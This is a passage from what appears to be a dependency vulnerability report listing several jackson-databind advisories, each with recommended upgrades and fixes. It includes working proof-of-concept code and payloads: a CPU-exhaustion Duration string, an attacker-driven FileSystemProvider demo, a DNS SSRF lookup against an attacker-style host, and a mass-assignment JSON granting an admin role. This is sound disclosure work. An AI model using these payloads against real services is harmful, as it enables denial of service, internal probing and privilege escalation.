// RESULT: REJECTED - InvalidTypeIdException: "...denied resolution"
```

**Observed output:**




$ java -cp .:build/classes PtvGapTest3
Trying: {"value":["java.io.File","/etc/passwd"]}
ACCEPTED, class=java.io.File value=/etc/passwd

$ java -cp .:build/classes PtvGapTest4
Trying malicious substitution: ["PtvGapTest4$Holder",{"value":["java.io.File","/etc/passwd"]}]
REJECTED - InvalidTypeIdException: Could not resolve type id 'java.io.File' as a
subtype of java.lang.Comparable: Configured PolymorphicTypeValidator denied resolution




### Impact
Any application declaring an `@JsonTypeInfo`-annotated property or class with `Comparable` as its base type, without a separately configured restrictive `PolymorphicTypeValidator`, will accept a type identifier for essentially any class implementing `Comparable`. Concrete impact is demonstrated via `java.io.File`: an attacker can cause construction of a `File` object for an arbitrary, attacker-chosen path. On its own this is a controlled-object-instantiation primitive; if the application later calls path-sensitive or mutating methods on the received value, this becomes a path-traversal-adjacent primitive. 

**Suggested remediation:**
1. Add `java.lang.Comparable` to `UnsafeBaseTypes.UNSAFE`.
2. Audit other broad JDK interfaces (`java.lang.Iterable`, `java.util.EventListener`) for the same gap.
3. Consider a narrower default for `isSafeSubType()` for base types outside the fixed denylist, rather than unconditional `true`.

### CVE-2026-68497: jackson-databind: Duration XMLGregorianCalendar Unbounded Number Parse DoS
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:78

[CVE-2026-68497](https://github.com/advisories/GHSA-q4xh-88c3-wmh7): jackson-databind: Duration XMLGregorianCalendar Unbounded Number Parse DoS

Severity: HIGH

Affected resolved dependencies:
  - com.fasterxml.jackson.core:jackson-databind:2.19.0 (compile; via spring-boot-starter-json at pom.xml:78); affected range >= 2.19.0, < 2.21.6

Recommended fix:
  - com.fasterxml.jackson.core:jackson-databind: upgrade to 2.21.6 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
### Summary
`jackson-databind` 3.2.1 deserializes a JSON **string** bound to a `javax.xml.datatype.Duration` or `javax.xml.datatype.XMLGregorianCalendar` field by passing the raw string verbatim to `DatatypeFactory.newDuration(value)` / `newXMLGregorianCalendar(value)`. Per the XML-Schema lexical grammar these factory methods accept numeric components of arbitrary length, which the JDK materializes into `java.math.BigInteger` / `BigDecimal` using the native `BigInteger(String)` constructor (an O(n²) parser). Because the digits reside inside a JSON **string** token, jackson-core's `StreamReadConstraints.maxNumberLength` guard (which bounds only JSON *number* tokens) never fires, so there is no length limit anywhere on this path. An unauthenticated attacker can submit a single small request (e.g. ~1–5 MB) that forces tens of seconds to minutes of single-thread CPU consumption, yielding a denial of service under the default `JsonMapper.builder().build()` mapper with no polymorphic typing or special configuration.

### Details
`StreamReadConstraints.maxNumberLength` (jackson-core, default 1000) bounds the **text length of JSON number tokens** only; it does not apply to digits inside a JSON string token (`maxStringLength` default is 100,000,000). jackson's own value binders compensate for this gap elsewhere — `NumberDeserializers` explicitly call `streamReadConstraints().validateIntegerLength(text.length())` / `validateFPLength(text.length())` before parsing a *stringified* number (`NumberDeserializers.java:1063`, `:1139`). The XML-datatype deserializer omits this identical pre-check.

`CoreXMLDeserializers` registers `Std` deserializers **by default** for any field typed `javax.xml.datatype.Duration` or `XMLGregorianCalendar` (`findBeanDeserializer`), with no opt-in required. `Std._deserialize` hands the attacker string straight to the datatype factory:

```java
protected Object _deserialize(String value, DeserializationContext ctxt) {
    switch (_kind) {
    case TYPE_DURATION:
        return _dataTypeFactory.newDuration(value);                 // attacker lexical string
    case TYPE_G_CALENDAR:
        Date d;
        try { d = _parseDate(value, ctxt); }
        catch (DatabindException e) {
            return _dataTypeFactory.newXMLGregorianCalendar(value); // attacker lexical string
        }
        return _gregorianFromDate(ctxt, d);
    }
    throw new IllegalStateException();
}
```

Per the XSD lexical rules, `newDuration` parses each numeric component (years, months, …) into a `BigInteger`, and `newXMLGregorianCalendar` parses fractional seconds into a `BigDecimal`. The JDK uses the native `BigInteger(String)` / `BigDecimal(String)` constructors, which are O(n²) in the digit count. A short JSON string such as `"P" + "9"×N + "Y"` therefore forces the allocation and O(N²) parse of an N-digit `BigInteger`, entirely downstream of every jackson-core constraint.

## Vulnerable Code Location

- `src/main/java/tools/jackson/databind/ext/CoreXMLDeserializers.java:137`
  — `newDuration(value)` (TYPE_DURATION)
- `src/main/java/tools/jackson/databind/ext/CoreXMLDeserializers.java:147`
  — `newXMLGregorianCalendar(value)` (TYPE_G_CALENDAR fallback)
- Registration (default, no opt-in):
  `src/main/java/tools/jackson/databind/ext/CoreXMLDeserializers.java:42-46`
  (`findBeanDeserializer` returns `Std` for `XMLGregorianCalendar` / `Duration`)
- Contrast — correct length-guard pattern already used elsewhere in the library:
  `src/main/java/tools/jackson/databind/deser/jdk/NumberDeserializers.java:1063,1139`

## Proof of Concept

PoC source (`Vuln07_DurationDoS.java`). It uses only the public `ObjectMapper.readValue` API and a default mapper; the only "special" element is a normal DTO exposing a `javax.xml.datatype.Duration` field.

```java
package com.poc;

import tools.jackson.databind.ObjectMapper;
import tools.jackson.databind.json.JsonMapper;
import javax.xml.datatype.Duration;

/**
 * Vuln 7: Unbounded numeric allocation / CPU DoS via Duration lexical deserialization.
 * A short JSON string forces parsing of a huge BigInteger inside DatatypeFactory.newDuration.
 */
public class Vuln07_DurationDoS {
    public static class Cfg { public Duration ttl; }

    public static void main(String[] args) throws Exception {
        ObjectMapper mapper = JsonMapper.builder().build();
        int digits = Integer.getInteger("digits", 5_000_000);

        // Baseline small parse.
        long t0 = System.nanoTime();
        mapper.readValue("{\"ttl\":\"P1Y\"}", Cfg.class);
        long tBase = System.nanoTime() - t0;
        System.out.println("Baseline (P1Y) parse: " + (tBase/1_000_000) + " ms");

        String big = "P" + "9".repeat(digits) + "Y";
        String json = "{\"ttl\":\"" + big + "\"}";
        System.out.println("Payload JSON size ~ " + json.length() + " bytes (year component = " + digits + " digits)");
        long t1 = System.nanoTime();
        try {
            Cfg c = mapper.readValue(json, Cfg.class);
            long dt = System.nanoTime() - t1;
            System.out.println("Parsed giant Duration in " + (dt/1_000_000) + " ms; years field type materialized as BigInteger");
            System.out.println("RESULT: VULNERABLE - " + digits + "-digit BigInteger parsed from a "
                    + json.length() + "-byte payload (amplified CPU/allocation, StreamReadConstraints bypassed)");
        } catch (Throwable t) {
            long dt = System.nanoTime() - t1;
            System.out.println("After " + (dt/1_000_000) + " ms threw " + t.getClass().getName() + ": " + t.getMessage());
        }
    }
}
```

Minimal HTTP-shaped payload (what an attacker sends):

```json
{ "ttl": "P99999999999999999999…9Y" }   // 'P' + N nines + 'Y', N up to ~100,000,000
```

An `XMLGregorianCalendar` field is equally affected via the fractional-seconds path, e.g.
`{ "at": "0000-01-01T00:00:00." + "9"×N }`.

## Execution Steps

The PoC needs only the three Jackson 3.2.1 jars on the classpath; it can be built and run with plain `javac`/`java` (no Maven required). The jars are the standard published artifacts (here resolved from the local Maven cache `~/.m2`, but any copy works).

```bash
# 0. Locate the three dependency jars (published Maven artifacts).
M2="$HOME/.m2/repository"
DB="$M2/tools/jackson/core/jackson-databind/3.2.1/jackson-databind-3.2.1.jar"
CORE="$M2/tools/jackson/core/jackson-core/3.2.1/jackson-core-3.2.1.jar"
ANN="$M2/com/fasterxml/jackson/core/jackson-annotations/2.22/jackson-annotations-2.22.jar"
CP="$DB:$CORE:$ANN"
#   If not already cached, fetch them once, e.g.:
#   mvn -q dependency:get -Dartifact=tools.jackson.core:jackson-databind:3.2.1
#   (jackson-core 3.2.1 and jackson-annotations 2.22 come as transitive deps)

# 1. Compile with javac (single source file).
mkdir -p out
javac -cp "$CP" -d out src/main/java/com/poc/Vuln07_DurationDoS.java

# 2. Quick confirmation (~11 s): 1,000,000-digit year component.
java -Xmx2g -Ddigits=1000000 -cp "out:$CP" com.poc.Vuln07_DurationDoS

# 3. Full-severity demonstration (~293 s): 5,000,000-digit year component.
java -Xmx2g -Ddigits=5000000 -cp "out:$CP" com.poc.Vuln07_DurationDoS
```

The `digits` system property controls the number of `9` characters in the year component; JSON payload size ≈ digits + 12 bytes. Increase toward the default 100,000,000 `maxStringLength` to scale cost further.

Environment used for the evidence below: jackson-databind 3.2.1, jackson-core 3.2.1, jackson-annotations 2.22; OpenJDK 25 on macOS (darwin), default `JsonMapper.builder().build()`.

## Reproduction Evidence

Deterministic values (payload byte count, resulting bit-length) are exact across runs; timings vary with load. Two independent runs at different sizes:

**digits = 5,000,000 (~5 MB payload):**
```
Baseline (P1Y) parse: 27 ms
Payload JSON size ~ 5000012 bytes (year component = 5000000 digits)
Parsed giant Duration in 293175 ms; years field type materialized as BigInteger
RESULT: VULNERABLE - 5000000-digit BigInteger parsed from a 5000012-byte payload (amplified CPU/allocation, StreamReadConstraints bypassed)
```

**digits = 1,000,000 (~1 MB payload, for fast repeatability):**
```
Baseline (P1Y) parse: 53 ms
Payload JSON size ~ 1000012 bytes (year component = 1000000 digits)
Parsed giant Duration in 11155 ms; years field type materialized as BigInteger
RESULT: VULNERABLE - 1000000-digit BigInteger parsed from a 1000012-byte payload (amplified CPU/allocation, StreamReadConstraints bypassed)
```

Interpretation: a normal `"P1Y"` value parses in tens of milliseconds; a ~1 MB attacker payload consumes **~11 s** and a ~5 MB payload **~293 s** of single-thread CPU — a 5–6 order-of-magnitude amplification. The super-linear growth (≈26× cost for 5× payload) is consistent with the JDK's O(n²) `BigInteger(String)` constructor. The cost occurs inside `DatatypeFactory.newDuration`, downstream of jackson-core's `StreamReadConstraints` (independently confirmed: the same digit sequence supplied as a bare JSON *number* token is rejected with `StreamConstraintsException`, whereas inside a string token it is not bounded).

## Impact

An unauthenticated attacker can stall a request-processing thread for tens of seconds to minutes and allocate a large `BigInteger`/`BigDecimal` from a single small request. Because the cost is CPU-bound and super-linear, a handful of concurrent requests can saturate the server's worker threads and CPU, denying service to all users. The exposure requires only that a bound type expose a `javax.xml.datatype.Duration` or `XMLGregorianCalendar` field  common in applications that ingest XML-schema derived data, SOAP/JAXB-adjacent models, or configuration carrying XSD durations — and fires under the default mapper with no polymorphic typing.

## Recommended Fix

Apply the same validate-length-then-parse idiom the core `NumberDeserializers` already use:

1. In `CoreXMLDeserializers.Std._deserialize`, enforce a maximum raw-string length before
   calling `newDuration(value)` / `newXMLGregorianCalendar(value)` — e.g. reject inputs
   longer than `ctxt.streamReadConstraints().getMaxNumberLength()` (or a dedicated bound),
   routing over-length input through `ctxt.handleWeirdStringValue(...)`.
2. Alternatively, validate the lexical form against a bounded regex and cap the digit count
   of each numeric component before delegating to `DatatypeFactory`.
3. Document that `Duration` / `XMLGregorianCalendar` fields bound from untrusted input must
   be length-limited at the transport layer.

### CVE-2026-19032: jackson-databind: Path Deserialization Missing Scheme Allowlist for FileSystemProvider Resolution
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:78

[CVE-2026-19032](https://github.com/advisories/GHSA-wjgm-6hv5-3cvf): jackson-databind: Path Deserialization Missing Scheme Allowlist for FileSystemProvider Resolution

Severity: MEDIUM

Affected resolved dependencies:
  - com.fasterxml.jackson.core:jackson-databind:2.19.0 (compile; via spring-boot-starter-json at pom.xml:78); affected range >= 2.19.0, < 2.21.6

Recommended fix:
  - com.fasterxml.jackson.core:jackson-databind: upgrade to 2.21.6 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
### Summary

A `java.nio.file.Path` field bound from untrusted JSON reaches `JDKFromStringDeserializer.NioPathHelper.deserialize`. The attacker string flows through `new URI(value)` → `Path.of(uri)`, then on `FileSystemNotFoundException` into a `ServiceLoader<FileSystemProvider>` enumeration that calls `provider.getPath(uri)` on the first scheme-matching provider. No scheme is rejected, so untrusted JSON can drive an arbitrary registered provider under the default `JsonMapper.builder().build()`.

Impact is bounded. The JDK built-in providers (`file`, `jar`/zipfs) do no network I/O and do not mount, so the path is inert without a side-effecting third-party provider. Binding `Path` from untrusted input is already an anti-pattern.

### Description

`NioPathHelper.deserialize` performs provider resolution driven by the attacker URI (abridged; the real method also handles a Windows drive-letter prefix and wraps failures via `ctxt.handleInstantiationProblem(...)`):

```java
int colonIx = value.indexOf(':');
if (colonIx < 0) { return Path.of(value); }
...
final URI uri = new URI(value);          // attacker-controlled URI string
try {
    return Path.of(uri);                  // resolves scheme -> may load a FileSystemProvider
} catch (FileSystemNotFoundException cause) {
    final String scheme = uri.getScheme();
    for (FileSystemProvider provider : ServiceLoader.load(FileSystemProvider.class)) {
        if (provider.getScheme().equalsIgnoreCase(scheme)) {
            return provider.getPath(uri);  // attacker scheme selects & drives a provider
        }
    }
    // no matching provider -> ctxt.handleInstantiationProblem(...) (throws by default)
}
```

The attacker's scheme selects the provider and the attacker's URI is passed to it; the enumeration also forces provider classloading during `readValue`. For built-in schemes like `jar:`, `getPath` throws `FileSystemNotFoundException` (a mount requires explicit `newFileSystem`), surfacing as a wrapped `ValueInstantiationException` with no terminal effect. Any mount, network I/O, or resource access depends entirely on the selected provider.

## Vulnerable Code Location

- `src/main/java/tools/jackson/databind/deser/jdk/JDKFromStringDeserializer.java`
  - `STD_PATH` → `NioPathHelper.deserialize`; `NioPathHelper.deserialize` body 
       (`new URI` → `Path.of(uri)` → `ServiceLoader.load(FileSystemProvider.class)` → `provider.getPath(uri)`).


## Proof of Concept

Two PoCs are provided. 

> PoC 2 registers a custom `FileSystemProvider` to show that attacker JSON reaches `provider.getPath(attackerURI)` inside `readValue`. Whether a third-party provider then does anything harmful is outside the library's control. The in-scope issue is **PoC 1** — the `jar:`/arbitrary-scheme path reaching the `ServiceLoader` fallback with no scheme restriction.

**PoC 1 — sink reached (built-in `jar` provider).** 

`com/poc/Vuln04_PathProvider.java`:
```java
package com.poc;

import tools.jackson.databind.ObjectMapper;
import tools.jackson.databind.json.JsonMapper;
import java.nio.file.Path;

/**
 * Vuln 4: java.nio.file.Path deserialization resolves an attacker URI via
 * Path.of(uri) / ServiceLoader<FileSystemProvider>.
 */
public class Vuln04_PathProvider {
    public static class Config { public Path workdir; }

    public static void main(String[] args) throws Exception {
        ObjectMapper mapper = JsonMapper.builder().build();
        // jar: scheme forces FileSystemProvider resolution / mounting attempt on attacker URI.
        String json = "{\"workdir\":\"jar:file:/tmp/jackson_poc_evil.zip!/x\"}";
        System.out.println("Deserializing (default mapper): " + json);
        try {
            Config c = mapper.readValue(json, Config.class);
            System.out.println("Resolved Path = " + c.workdir + "  (class=" + (c.workdir==null?"null":c.workdir.getClass().getName()) + ")");
            System.out.println("RESULT: VULNERABLE - attacker URI scheme resolved through provider machinery during readValue");
        } catch (Throwable t) {
            System.out.println("Throwable during resolution: " + t.getClass().getName() + ": " + t.getMessage());
            System.out.println("RESULT: VULNERABLE (attacker URI drove provider resolution; threw " + t.getClass().getSimpleName() + " inside readValue)");
        }
    }
}
```

**PoC 2 — scheme-selection mechanism demo (custom `FileSystemProvider`).**
A third-party provider (scheme `evilscheme`) registered via `META-INF/services/java.nio.file.spi.FileSystemProvider`, which is standing in for *any* provider a real application ships. 

`com/poc/EvilFileSystemProvider.java`:
```java
package com.poc;

import java.nio.file.*;
import java.nio.file.spi.FileSystemProvider;
import java.nio.file.attribute.*;
import java.net.URI;
import java.io.IOException;
import java.util.*;
import java.util.Set;
import java.nio.channels.SeekableByteChannel;

/**
 * A custom java.nio.file.spi.FileSystemProvider registered via META-INF/services, using the
 * scheme "evilscheme". It stands in for ANY third-party FileSystemProvider present on a real
 * application's classpath. Its static initializer and getPath() record that they executed,
 * proving that attacker-controlled JSON drove provider class loading + provider.getPath(uri)
 * inside jackson's readValue.
 */
public class EvilFileSystemProvider extends FileSystemProvider {
    public static volatile boolean STATIC_INIT_RAN = false;
    public static volatile String GET_PATH_URI = null;
    static { STATIC_INIT_RAN = true; }

    @Override public String getScheme() { return "evilscheme"; }

    @Override public Path getPath(URI uri) {
        GET_PATH_URI = uri.toString();
        System.out.println(">>> [EVIL-PROVIDER] getPath() invoked with attacker URI: " + uri);
        // A malicious/vulnerable provider could here open a socket, read a file, mount a FS, etc.
        return java.nio.file.Path.of(System.getProperty("java.io.tmpdir"), "evilprovider-marker");
    }

    // --- remaining abstract methods: minimal stubs ---
    @Override public FileSystem newFileSystem(URI uri, Map<String,?> env) { throw new UnsupportedOperationException(); }
    @Override public FileSystem getFileSystem(URI uri) { throw new FileSystemNotFoundException(); }
    @Override public SeekableByteChannel newByteChannel(Path p, Set<? extends OpenOption> o, FileAttribute<?>... a) throws IOException { throw new UnsupportedOperationException(); }
    @Override public DirectoryStream<Path> newDirectoryStream(Path d, DirectoryStream.Filter<? super Path> f) { throw new UnsupportedOperationException(); }
    @Override public void createDirectory(Path d, FileAttribute<?>... a) { throw new UnsupportedOperationException(); }
    @Override public void delete(Path p) { throw new UnsupportedOperationException(); }
    @Override public void copy(Path s, Path t, CopyOption... o) { throw new UnsupportedOperationException(); }
    @Override public void move(Path s, Path t, CopyOption... o) { throw new UnsupportedOperationException(); }
    @Override public boolean isSameFile(Path p, Path p2) { return false; }
    @Override public boolean isHidden(Path p) { return false; }
    @Override public FileStore getFileStore(Path p) { throw new UnsupportedOperationException(); }
    @Override public void checkAccess(Path p, AccessMode... m) { }
    @Override public <V extends FileAttributeView> V getFileAttributeView(Path p, Class<V> t, LinkOption... o) { return null; }
    @Override public <A extends BasicFileAttributes> A readAttributes(Path p, Class<A> t, LinkOption... o) { throw new UnsupportedOperationException(); }
    @Override public Map<String,Object> readAttributes(Path p, String a, LinkOption... o) { throw new UnsupportedOperationException(); }
    @Override public void setAttribute(Path p, String a, Object v, LinkOption... o) { }
}
```

Registration descriptor —
`src/main/resources/META-INF/services/java.nio.file.spi.FileSystemProvider`:
```
com.poc.EvilFileSystemProvider
```

Driver — `com/poc/Vuln04b_PathProviderMount.java`:
```java
package com.poc;

import tools.jackson.databind.ObjectMapper;
import tools.jackson.databind.json.JsonMapper;

/**
 * Vuln 4 (end-to-end terminal effect): a third-party FileSystemProvider registered via
 * META-INF/services (scheme "evilscheme") stands in for any provider on a real app's
 * classpath. Attacker JSON with that scheme drives jackson's ServiceLoader fallback to
 * (1) load the provider class (running its static initializer) and (2) invoke
 * provider.getPath(attackerUri) -- all inside readValue, with NO application code.
 */
public class Vuln04b_PathProviderMount {
    public static class Config { public java.nio.file.Path workdir; }

    public static void main(String[] args) throws Exception {
        System.out.println("Provider static-init ran before deserialization? " + EvilFileSystemProvider.STATIC_INIT_RAN);
        ObjectMapper mapper = JsonMapper.builder().build();   // default config
        String json = "{\"workdir\":\"evilscheme://attacker-controlled/target?x=1\"}";
        System.out.println("Deserializing (default mapper): " + json);

        Config c = mapper.readValue(json, Config.class);

        System.out.println("Resolved Path = " + c.workdir);
        System.out.println("Provider static-init ran: " + EvilFileSystemProvider.STATIC_INIT_RAN);
        System.out.println("Provider.getPath() attacker URI: " + EvilFileSystemProvider.GET_PATH_URI);
        boolean ok = EvilFileSystemProvider.GET_PATH_URI != null
                && EvilFileSystemProvider.GET_PATH_URI.contains("attacker-controlled");
        System.out.println(ok
            ? "RESULT: VULNERABLE - attacker JSON drove ServiceLoader provider load + provider.getPath(attackerUri) inside readValue (terminal effect proven)"
            : "RESULT: NOT reproduced");
    }
}
```

## Execution Steps

The PoCs need only the three Jackson 3.2.1 jars on the classpath and can be built with plain `javac`/`java` . PoC 2 additionally requires the `META-INF/services` descriptor to be on the **runtime** classpath

```bash
# 0. Locate the three published dependency jars.
M2="$HOME/.m2/repository"
DB="$M2/tools/jackson/core/jackson-databind/3.2.1/jackson-databind-3.2.1.jar"
CORE="$M2/tools/jackson/core/jackson-core/3.2.1/jackson-core-3.2.1.jar"
ANN="$M2/com/fasterxml/jackson/core/jackson-annotations/2.22/jackson-annotations-2.22.jar"
CP="$DB:$CORE:$ANN"

# 1. Compile the three sources.
cd poc-project
mkdir -p out
javac -cp "$CP" -d out \
  src/main/java/com/poc/EvilFileSystemProvider.java \
  src/main/java/com/poc/Vuln04_PathProvider.java \
  src/main/java/com/poc/Vuln04b_PathProviderMount.java

# 2. Put the ServiceLoader descriptor on the runtime classpath (needed by PoC 2).
mkdir -p out/META-INF/services
cp src/main/resources/META-INF/services/java.nio.file.spi.FileSystemProvider \
   out/META-INF/services/java.nio.file.spi.FileSystemProvider

# 3. Run both PoCs.
java -cp "out:$CP" com.poc.Vuln04_PathProvider        # PoC 1
java -cp "out:$CP" com.poc.Vuln04b_PathProviderMount  # PoC 2
```

## Reproduction Evidence

Executed against jackson-databind 3.2.1 (OpenJDK 25).

**PoC 1 :**
```
Deserializing (default mapper): {"workdir":"jar:file:/tmp/jackson_poc_evil.zip!/x"}
Throwable during resolution: tools.jackson.databind.exc.ValueInstantiationException: Cannot construct instance of `java.nio.file.Path`, problem: `java.nio.file.FileSystemNotFoundException`
 at [Source: REDACTED (`StreamReadFeature.INCLUDE_SOURCE_IN_LOCATION` disabled); byte offset: #UNKNOWN] (through reference chain: com.poc.Vuln04_PathProvider$Config["workdir"])
RESULT: VULNERABLE (attacker URI drove provider resolution; threw ValueInstantiationException inside readValue)
```
Notes: the JDK **built-in** `jar` provider's `getPath` does not auto-mount (it also throws `FileSystemNotFoundException`, since only `newFileSystem` mounts). PoC 1 proves the in-scope defect: attacker input reaches the scheme-driven `ServiceLoader` resolution during `readValue` with no allow-list. PoC 2 only illustrates the downstream mechanism.

**PoC 2  :**
```
Provider static-init ran before deserialization? true
Deserializing (default mapper): {"workdir":"evilscheme://attacker-controlled/target?x=1"}
>>> [EVIL-PROVIDER] getPath() invoked with attacker URI: evilscheme://attacker-controlled/target?x=1
Resolved Path = /var/folders/.../T/evilprovider-marker
Provider static-init ran: true
Provider.getPath() attacker URI: evilscheme://attacker-controlled/target?x=1
RESULT: VULNERABLE - attacker JSON drove ServiceLoader provider load + provider.getPath(attackerUri) inside readValue (terminal effect proven)
```
Purely from a JSON string, jackson's `ServiceLoader` fallback selected the attacker-named scheme's provider and invoked `provider.getPath(uri)` with the full attacker URI inside `readValue`. Whether a given provider then does anything harmful is outside the library's control; the in-scope issue is the absence of a scheme restriction before this fallback runs.

## Impact

Untrusted JSON drives `provider.getPath(attackerURI)` on an attacker-chosen provider during `readValue`. With only the JDK built-in providers this is inert. Real impact requires a side-effecting third-party provider on the classpath. The fix is to close the
scheme-restriction gap.

## Recommended Fix

1. **Restrict the resolved scheme to a fixed, hard-coded set** ; reject `jar:` and other schemes via `ctxt.handleWeirdStringValue(...)`. A hard-coded set keeps the fix backport-safe with no new configuration surface.
2. **Skip the `ServiceLoader<FileSystemProvider>` enumeration for disallowed schemes**, so untrusted JSON cannot select and drive an arbitrary registered provider.
3. Document that `java.nio.file.Path`-typed fields should not be bound from untrusted JSON.

### CVE-2026-77310: jackson-databind: Incomplete fix for CVE-2026-54514: eager DNS resolution (SSRF) still present in InetAddress deserialization
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:78

[CVE-2026-77310](https://github.com/advisories/GHSA-vvgp-rfg2-7rr6): jackson-databind: Incomplete fix for CVE-2026-54514: eager DNS resolution (SSRF) still present in InetAddress deserialization

Severity: MEDIUM

Affected resolved dependencies:
  - com.fasterxml.jackson.core:jackson-databind:2.19.0 (compile; via spring-boot-starter-json at pom.xml:78); affected range >= 2.19.0, < 2.21.5

Recommended fix:
  - com.fasterxml.jackson.core:jackson-databind: upgrade to 2.21.5 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
### Summary
CVE-2026-54514 (GHSA-hgj6-7826-r7m5) fixed an eager-DNS-resolution / SSRF issue in jackson-databind's deserialization of `java.net.InetSocketAddress` by switching to `InetSocketAddress.createUnresolved(...)` (PR #5951, commit 1f5a1037, released in 2.18.8 / 2.21.4 / 3.1.4). That fix did not cover the sibling `java.net.InetAddress` branch in the very same `FromStringDeserializer.Std._deserialize()` switch statement, which still calls `InetAddress.getByName(value)` and therefore performs an eager forward DNS lookup on attacker-controlled input at deserialization time. The fix is incomplete: the same vulnerability class remains reachable through `InetAddress`.

### Details
File: src/main/java/com/fasterxml/jackson/databind/deser/std/FromStringDeserializer.java

Sibling cases in the same switch:
- Line 357-358 (UNFIXED):
    case STD_INET_ADDRESS:
        return InetAddress.getByName(value);     // eager forward DNS lookup
- Line 359-381 + helper at 494-496 (FIXED by PR #5951):
    protected InetSocketAddress _inetSocketAddress(String host, int port) {
        // 05-May-2026, tatu: [databind#5951] Prevent DNS lookup:
        return InetSocketAddress.createUnresolved(host, port);   // no DNS
    }

`InetAddress` is a registered standard string-like scalar type (FromStringDeserializer.types() line 73; findDeserializer() maps it to STD_INET_ADDRESS at line 119-120). Any value deserialized into an `InetAddress`-typed target — a plain POJO field, a polymorphic subtype, or a default-typing-permitted slot — reaches `InetAddress.getByName(attackerControlledString)`, which invokes the OS/JVM resolver and performs forward DNS resolution before any application validation.

The parent fix's own added unit test asserts `address.isUnresolved()` with the comment "should NOT resolve address", confirming that performing DNS resolution during deserialization is precisely the behavior being treated as the vulnerability. The InetAddress branch still violates that property.

Verified against the FIXED released artifact (jackson-databind 2.18.8, from Maven Central): decompiled bytecode shows the InetSocketAddress branch now routes through `_inetSocketAddress -> createUnresolved`, while `InetAddress.getByName` is still emitted unchanged in the InetAddress branch.

### PoC
Lab-only, zero network egress. Run against the fixed jackson-databind 2.18.8.

A custom JDK InetAddressResolver SPI (Java 18+) counts forward lookups locally and answers with loopback, so no traffic leaves the host:

    ObjectMapper m = new ObjectMapper();
    // InetSocketAddress (patched): 0 resolver lookups, isUnresolved=true
    m.readValue("\"internal-metadata.attacker-oob.example:8080\"", InetSocketAddress.class);
    // InetAddress (unpatched sibling): 1 resolver lookup on the attacker host
    m.readValue("\"internal-metadata.attacker-oob.example\"", InetAddress.class);

Observed output (jackson 2.18.8):
    [A] InetSocketAddress  isUnresolved=true  resolverLookups=0  lastHost=null
    [B] InetAddress        value=localhost/127.0.0.1  resolverLookups=1  lastHost=internal-metadata.attacker-oob.example

A standalone variant (no SPI) using an RFC-6761 `.invalid` canary host shows the same: deserializing into InetAddress raises UnknownHostException (the OS resolver was invoked), while InetSocketAddress stays unresolved. Full source in PocResolverCount.java and PocInetAddressIncompleteFix.java.

Reachability with a plain field (no annotations, no polymorphism, no default typing):
    static class Config { public InetAddress bindHost; public int port; }
    mapper.readValue("{\"bindHost\":\"poc-reach.example\",\"port\":1}", Config.class);
    // -> resolver invoked on "poc-reach.example"

### Impact
An attacker who can influence JSON deserialized into an `InetAddress` target can force the application to perform outbound forward DNS lookups for attacker-chosen hostnames at deserialization time, before any application-level validation. This yields a DNS-based SSRF / OOB primitive: out-of-band exfiltration / interaction via DNS callbacks, and blind probing of whether internal hostnames resolve (internal-host enumeration). This is the same impact class and trust boundary for which CVE-2026-54514 (CVSS 5.3, CWE-918) was assigned to the InetSocketAddress branch. It is a DNS-lookup / blind SSRF primitive, not arbitrary HTTP SSRF or RCE; it does not itself open a socket.

Suggested fix: avoid eager resolution for InetAddress as well — e.g. defer resolution, validate the host string before resolving, or provide an opt-in/opt-out consistent with the InetSocketAddress fix (there is no direct unresolved-InetAddress equivalent, so deferring/validating or documenting the resolution is the practical mitigation).

Credit : Ta Duc Thien

### CVE-2026-59889: jackson-databind: @JsonView bypassed for @JsonUnwrapped container properties on deserialization
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:78

[CVE-2026-59889](https://github.com/advisories/GHSA-5gvw-p9qm-jgwh): jackson-databind: @JsonView bypassed for @JsonUnwrapped container properties on deserialization

Severity: MEDIUM

Affected resolved dependencies:
  - com.fasterxml.jackson.core:jackson-databind:2.19.0 (compile; via spring-boot-starter-json at pom.xml:78); affected range >= 2.19.0, < 2.21.5

Recommended fix:
  - com.fasterxml.jackson.core:jackson-databind: upgrade to 2.21.5 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
## Summary
`UnwrappedPropertyHandler.processUnwrapped()` replays the buffered JSON for a `@JsonUnwrapped` property by iterating its properties and calling `prop.deserializeAndSet()` with **no `prop.visibleInView(ctxt.getActiveView())` guard** — the exact guard `processUnwrappedCreatorProperties()` received in the #5971 / GHSA-rcqc-6cw3-h962 fix, and the guard `BeanDeserializer.deserializeWithUnwrapped` applies to directly-matched properties. As a result, a property annotated with both `@JsonView(PrivilegedView.class)` and `@JsonUnwrapped` is written from attacker JSON even when deserializing under a more-restrictive active view.

**Correction to the original framing (runtime-verified):** the gap is NOT a per-field inner `@JsonView` (the unwrapped sub-object's own `BeanDeserializer` gates inner fields correctly). The unchecked gate is the **view of the unwrapped CONTAINER property**.

## Intent proof (runtime, 2.x HEAD 21dd70dd and 3.x HEAD 7a5939d6)
An `@JsonView(AdminView)` property that is NOT `@JsonUnwrapped` → `null` under `PublicView` (correctly gated). The identical property WITH `@JsonUnwrapped` → fully populated (bypass). The fix the creator path already received, not applied to the regular-property method.

## Impact — write-side mass-assignment / privilege escalation
`@JsonView` is commonly used as a write-side authorization guard: a public endpoint binds the body under `readerWithView(PublicView.class)` and groups privileged state in a nested object whose container property is `@JsonView(AdminView)`. When that property is `@JsonUnwrapped`, an untrusted caller mass-assigns it. PoC: a self-service registration where `AccountFlags{role,approved,creditBalance}` is `@JsonView(AdminView) @JsonUnwrapped`; attacker JSON `{role:ADMIN,approved:true,creditBalance:1000000}` under `PublicView` binds all three → approved admin with arbitrary balance. The failing gate is a WRITE gate, hence integrity-high (`C:N/I:H/A:N`); no worse than the C:L/I:L parent and arguably higher as `@JsonView`-as-write-guard is the exact use case #5971/#5969 defended.

## Affected
